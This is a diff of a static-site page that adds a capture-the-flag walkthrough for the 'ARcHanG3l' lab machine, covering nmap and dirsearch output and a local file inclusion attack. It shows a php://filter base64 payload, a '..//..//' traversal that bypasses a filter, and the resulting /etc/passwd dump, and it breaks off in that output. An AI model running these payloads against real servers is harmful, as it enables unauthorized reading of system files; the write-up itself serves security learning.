@@ -9,6 +9,8 @@
       
       
       
+        <link rel="prev" href="../colddbox/">
+      
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.13">
@@ -166,13 +168,15 @@
         
   
   
+    
+  
 
 
   
   
   
     <li class="md-tabs__item">
-      <a href="../colddbox/" class="md-tabs__link">
+      <a href="../colddbox/" class="md-tabs__link md-tabs__link--active">
         Easy Challenges
       </a>
     </li>
@@ -283,16 +287,16 @@
 
   
   
+    
+  
   
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
       
       
       
-        
-      
-      <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1" >
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" checked>
       
       
       
@@ -301,7 +305,7 @@
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="true">
         <label class="md-nav__title" for="__nav_1">
           <span class="md-nav__icon md-icon"></span>
           Easy Challenges
@@ -317,6 +321,98 @@
       <a href="../colddbox/" class="md-nav__link">
         ColddBox Easy
       </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          ARcHanG3l
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        ARcHanG3l
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#scanning" class="md-nav__link">
+    Scanning
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    Enumeration
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    Initial Access
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    Privilege Escalation
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gaining-user-access-horizontal" class="md-nav__link">
+    Gaining User access (Horizontal)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gaining-root-access-vertical" class="md-nav__link">
+    Gaining Root access (Vertical)
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -535,15 +631,15 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#gaining-user-access" class="md-nav__link">
-    Gaining User access
+  <a href="#gaining-user-access-horizontal" class="md-nav__link">
+    Gaining User access (Horizontal)
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#gaining-root-access" class="md-nav__link">
-    Gaining Root access
+  <a href="#gaining-root-access-vertical" class="md-nav__link">
+    Gaining Root access (Vertical)
   </a>
   
 </li>
@@ -577,6 +673,14 @@
 <p class="admonition-title">Description</p>
 <p><p id="desc" style="font-size:15px"></p></p>
 </div>
+<p>Path to accomplish the CTF:</p>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Flag 1: Hostname</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Flag 2: Exploiting LFI</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Flag 3: Initial Access</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Flag 4: User Flag</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Flag 5: Root Flag</li>
+</ul>
 <h2 id="scanning"><b>Scanning</b><a class="headerlink" href="#scanning" title="Permanent link">&para;</a></h2>
 <ul>
 <li>
@@ -609,23 +713,398 @@
 </table>
 <ul>
 <li>Nmap Report:
-  <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>
+  <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="w">  </span><span class="c1"># Nmap 7.93 scan initiated Mon Feb 20 01:06:35 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.45.108</span>
+<span class="w">  </span>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.10.45.108
+<span class="w">  </span>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.15s<span class="w"> </span>latency<span class="o">)</span>.
+<span class="w">  </span>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">998</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
+<span class="w">  </span>PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+<span class="hll"><span class="w">  </span><span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">7</span>.6p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.3<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
+<span class="w">  </span><span class="p">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span>9f1d2c9d6ca40e4640506fedcf1cf38c<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
+<span class="w">  </span><span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>637327c76104256a08707a36b2f2840d<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="w">  </span><span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>b64ed29c3785d67653e8c4e0481cae6c<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="hll"><span class="w">  </span><span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.29<span class="w"> </span><span class="o">((</span>Ubuntu<span class="o">))</span>
+</span><span class="w">  </span><span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/2.4.29<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="w">  </span><span class="p">|</span>_http-title:<span class="w"> </span>Wavefire
+<span class="w">  </span>No<span class="w"> </span>exact<span class="w"> </span>OS<span class="w"> </span>matches<span class="w"> </span><span class="k">for</span><span class="w"> </span>host<span class="w"> </span><span class="o">(</span>If<span class="w"> </span>you<span class="w"> </span>know<span class="w"> </span>what<span class="w"> </span>OS<span class="w"> </span>is<span class="w"> </span>running<span class="w"> </span>on<span class="w"> </span>it,<span class="w"> </span>see<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span><span class="o">)</span>.
+<span class="w">  </span>TCP/IP<span class="w"> </span>fingerprint:
+<span class="w">  </span>OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span><span class="m">7</span>.93%E<span class="o">=</span><span class="m">4</span>%D<span class="o">=</span><span class="m">2</span>/20%OT<span class="o">=</span><span class="m">22</span>%CT<span class="o">=</span><span class="m">1</span>%CU<span class="o">=</span><span class="m">35053</span>%PV<span class="o">=</span>Y%DS<span class="o">=</span><span class="m">5</span>%DC<span class="o">=</span>I%G<span class="o">=</span>Y%TM<span class="o">=</span>63F30E0
+<span class="w">  </span>OS:7%P<span class="o">=</span>aarch64-unknown-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span><span class="m">105</span>%GCD<span class="o">=</span><span class="m">1</span>%ISR<span class="o">=</span><span class="m">106</span>%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%II<span class="o">=</span>I%TS
+<span class="w">  </span>OS:<span class="o">=</span>A<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M505ST11NW7%O2<span class="o">=</span>M505ST11NW7%O3<span class="o">=</span>M505NNT11NW7%O4<span class="o">=</span>M505ST11NW7%O5<span class="o">=</span>M
+<span class="w">  </span>OS:505ST11NW7%O6<span class="o">=</span>M505ST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>F4B3%W2<span class="o">=</span>F4B3%W3<span class="o">=</span>F4B3%W4<span class="o">=</span>F4B3%W5<span class="o">=</span>F4B3%W6<span class="o">=</span>F4
+<span class="w">  </span>OS:B3<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%W<span class="o">=</span>F507%O<span class="o">=</span>M505NNSNW7%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%S<span class="o">=</span>O%A<span class="o">=</span>
+<span class="w">  </span>OS:S+%F<span class="o">=</span>AS%RD<span class="o">=</span><span class="m">0</span>%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%W<span class="o">=</span><span class="m">0</span>%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span><span class="m">0</span>%Q
+<span class="w">  </span>OS:<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%W<span class="o">=</span><span class="m">0</span>%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span><span class="m">0</span>%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%W<span class="o">=</span><span class="m">0</span>%S<span class="o">=</span>A
+<span class="w">  </span>OS:%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span><span class="m">0</span>%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%W<span class="o">=</span><span class="m">0</span>%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span><span class="m">0</span>%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y
+<span class="w">  </span>OS:%DF<span class="o">=</span>N%T<span class="o">=</span><span class="m">40</span>%IPL<span class="o">=</span><span class="m">164</span>%UN<span class="o">=</span><span class="m">0</span>%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T
+<span class="w">  </span>OS:<span class="o">=</span><span class="m">40</span>%CD<span class="o">=</span>S<span class="o">)</span>
+
+<span class="w">  </span>Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">5</span><span class="w"> </span>hops
+<span class="w">  </span>Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+
+<span class="w">  </span>OS<span class="w"> </span>and<span class="w"> </span>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+<span class="w">  </span><span class="c1"># Nmap done at Mon Feb 20 01:07:03 2023 -- 1 IP address (1 host up) scanned in 27.88 seconds</span>
 </code></pre></div></td></tr></table></div></li>
 </ul>
 <h2 id="enumeration"><b>Enumeration</b><a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<p>As a part of Enumeration, I began by scanning the website on port 80 and stumbled upon a <code>wavefire</code> template. But thankfully, this led me to the domain name <mark class="critic">"mafialive.thm"</mark>, which I added to my <code>/etc/hosts</code> file and accessed via the domain name.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="m">127</span>.0.0.1<span class="w"> </span>localhost
+<span class="m">127</span>.0.1.1<span class="w"> </span>kali
+<span class="m">10</span>.10.180.241<span class="w"> </span>team.thm
+<span class="m">10</span>.10.180.241<span class="w"> </span>dev.team.thm
+<span class="m">10</span>.10.45.108<span class="w"> </span>mafialive.thm
+</code></pre></div></td></tr></table></div>
+<p><img id="image1" /></p>
+<p>Upon accessing the page, I discovered <code>flag-1</code></p>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Flag 1: Hostname</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Flag 2: Exploiting LFI</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Flag 3: Initial Access</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Flag 4: User Flag</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Flag 5: Root Flag</li>
+</ul>
+<p>But there was nothing noteworthy beyond that. As a result, I executed the <code>dirsearch</code> script to locate hidden directories and files. Here, I discovered <b>/test.php</b> and accessed it.</p>
+<p><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span></pre></div></td><td class="code"><div><pre><span></span><code>Extensions:<span class="w"> </span>php,<span class="w"> </span>aspx,<span class="w"> </span>jsp,<span class="w"> </span>html,<span class="w"> </span>js<span class="w"> </span><span class="p">|</span><span class="w"> </span>HTTP<span class="w"> </span>method:<span class="w"> </span>GET<span class="w"> </span><span class="p">|</span><span class="w"> </span>Threads:<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Wordlist<span class="w"> </span>size:<span class="w"> </span><span class="m">10927</span>
+
+Output<span class="w"> </span>File:<span class="w"> </span>/home/kali/.dirsearch/reports/mafialive.thm/_23-02-21_09-38-53.txt
+
+Error<span class="w"> </span>Log:<span class="w"> </span>/home/kali/.dirsearch/logs/errors-23-02-21_09-38-53.log
+
+Target:<span class="w"> </span>http://mafialive.thm/
+
+<span class="o">[</span><span class="m">09</span>:38:54<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>
+<span class="o">[</span><span class="m">09</span>:38:59<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/.ht_wsr.txt<span class="w">                                     </span>
+<span class="o">[</span><span class="m">09</span>:38:59<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/.htaccess.bak1
+<span class="o">[</span><span class="m">09</span>:38:59<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/.htaccess.sample
+<span class="o">[</span><span class="m">09</span>:38:59<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/.htaccess.orig
+<span class="o">[</span><span class="m">09</span>:38:59<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/.htaccess.save
+<span class="o">[</span><span class="m">09</span>:38:59<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/.htaccess_sc
+<span class="o">[</span><span class="m">09</span>:38:59<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/.htaccess_extra
+<span class="o">[</span><span class="m">09</span>:38:59<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/.htaccess_orig
+<span class="o">[</span><span class="m">09</span>:38:59<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/.htaccessBAK
+<span class="o">[</span><span class="m">09</span>:38:59<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/.htaccessOLD
+<span class="o">[</span><span class="m">09</span>:38:59<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/.htaccessOLD2
+<span class="o">[</span><span class="m">09</span>:38:59<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/.htm<span class="w">                                            </span>
+<span class="o">[</span><span class="m">09</span>:38:59<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/.html
+<span class="o">[</span><span class="m">09</span>:38:59<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/.htpasswd_test
+<span class="o">[</span><span class="m">09</span>:38:59<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/.htpasswds
+<span class="o">[</span><span class="m">09</span>:38:59<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/.httr-oauth
+<span class="o">[</span><span class="m">09</span>:39:01<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/.php<span class="w">                                            </span>
+<span class="o">[</span><span class="m">09</span>:39:34<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">   </span>59B<span class="w">  </span>-<span class="w"> </span>/index.html<span class="w">                                       </span>
+<span class="o">[</span><span class="m">09</span>:39:46<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">   </span>34B<span class="w">  </span>-<span class="w"> </span>/robots.txt<span class="w">                                       </span>
+<span class="o">[</span><span class="m">09</span>:39:47<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/server-status/<span class="w">                                   </span>
+<span class="o">[</span><span class="m">09</span>:39:47<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>278B<span class="w">  </span>-<span class="w"> </span>/server-status<span class="w">                                    </span>
+<span class="hll"><span class="o">[</span><span class="m">09</span>:39:51<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>286B<span class="w">  </span>-<span class="w"> </span>/test.php<span class="w">                                         </span>
+</span>
+Task<span class="w"> </span>Completed
+</code></pre></div></td></tr></table></div>
+This was quite interesting, because there was a button and when i clicked, it gave me a opportunity to explore on LFI (Local file Inclusion vulnerabilities)</p>
+<p><img id="image2" /></p>
+<p>In attempting to access "<code>/etc/passwd</code>" via the URL <ins class="critic">http://mafialive.thm/test.php?view=/etc/passwd</ins>, I encountered some restrictions. To determine the parameters of access permissions, including those that were denied, I proceeded to review the source code.</p>
+<p>I found this on web to encode the content as base64 and decode it back as php. </p>
+<div class="admonition tip">
+<p class="admonition-title">LFI-PHP Base64 Encode/Decode</p>
+<p><p id="desc" style="font-size:15px">php://filter/convert.base64-encode/resource=file:///etc/passwd</p></p>
+</div>
+<p>I proceeded to execute the following command: </p>
+<div class="highlight"><pre><span></span><code>http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=file:///var/www/html/development_testing/test.php 
+</code></pre></div>
+<p><img id="image3" /></p>
+<p>Upon decoding the result, I was able to successfully access the <code>test.php</code> file, and the source code appeared as follows. It seems that the flag-2 was hidden in the source code of the test.php file I accessed.</p>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Flag 1: Hostname</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Flag 2: Exploiting LFI</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Flag 3: Initial Access</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Flag 4: User Flag</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Flag 5: Root Flag</li>
+</ul>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="cp">&lt;!DOCTYPE HTML&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>INCLUDE<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Test Page. Not to be Deployed<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+
+    <span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/test.php?view=/var/www/html/development_testing/mrrobot.php&quot;</span><span class="p">&gt;&lt;</span><span class="nt">button</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;secret&quot;</span><span class="p">&gt;</span>Here is a button<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+        <span class="cp">&lt;?php</span>
+
+<span class="hll"><span class="cp">        //FLAG: thm{explo1t1ng_lf1}</span>
+</span>
+<span class="cp">            function containsStr($str, $substr) {</span>
+<span class="cp">                return strpos($str, $substr) !== false;</span>
+<span class="cp">            }</span>
+<span class="cp">        if(isset($_GET[&quot;view&quot;])){</span>
+<span class="hll"><span class="cp">        if(!containsStr($_GET[&#39;view&#39;], &#39;../..&#39;) &amp;&amp; containsStr($_GET[&#39;view&#39;], &#39;/var/www/html/development_testing&#39;)) {</span>
+</span><span class="cp">                include $_GET[&#39;view&#39;];</span>
+<span class="cp">            }else{</span>
+
+<span class="cp">        echo &#39;Sorry, Thats not allowed&#39;;</span>
+<span class="cp">            }</span>
+<span class="cp">    }</span>
+<span class="cp">        ?&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</code></pre></div></td></tr></table></div>
+<p>The restrictions placed on the "view" parameter are evident; specifically, the string <ins class="critic">var/www/html/development_testing</ins> was allowed, while any occurrence of ../.. was not permitted. Through reverse engineering, I found a way to bypass these limitations, resulting in the following modified command.</p>
+<div class="highlight"><pre><span></span><code>http://mafialive.thm/test.php?view<span class="o">=</span>/var/www/html/development_testing/..//..//..//../etc/passwd
+</code></pre></div>
+<p>That was working, and It gave me the results.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span></pre></div></td><td class="code"><div><pre><span></span><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing<span class="w"> </span>List<span class="w"> </span>Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
